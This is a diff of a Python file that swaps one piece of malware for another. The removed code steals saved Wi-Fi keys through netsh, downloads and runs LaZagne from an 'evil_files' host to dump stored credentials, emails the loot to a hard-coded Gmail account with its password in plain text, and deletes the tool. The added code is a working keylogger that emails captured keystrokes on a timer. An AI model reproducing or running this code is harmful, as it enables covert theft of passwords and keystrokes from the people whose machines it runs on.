@@ -1,37 +1,47 @@
-import subprocess, smtplib, re, os, tempfile, requests
+import smtplib
 
-def download(url):
-    get_response = requests.get(url)
-    file_name = url.split("/")[-1]
-    with open(file_name, "wb") as out_file:
-        out_file.write(get_response.content)
+import pynput.keyboard
+import threading
+import smtplib
 
+class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger Started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
-def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
-
-command = "netsh wlan show profile"
-networks = subprocess.check_output(command, shell=True)
-network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
-
-result = ""
-for network_name in network_names_list:
-    command = "netsh wlan show profile " + network_name + " key=clear"
-    current_result = subprocess.check_output(command, shell=True)
-    result = result + current_result
-
-temp_directory = tempfile.gettempdir()
-os.chdir(temp_directory)
-download("http://192.168.0.104/evil_files/lazagne.exe")
-result1 = subprocess.check_output("lazagne.exe all", shell=True)
+    def append_to_log(self, string):
+        self.log = self.log + string
 
 
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
-print("[+] Report is being sent to mail successfully...!!! ")
-send_mail("2020projects2020@gmail.com", "SohanMohitMridul!!", result)
-send_mail("2020projects2020@gmail.com", "SohanMohitMridul!!", result1)
-os.remove("lazagne.exe")
+
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def send_mail(self,email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
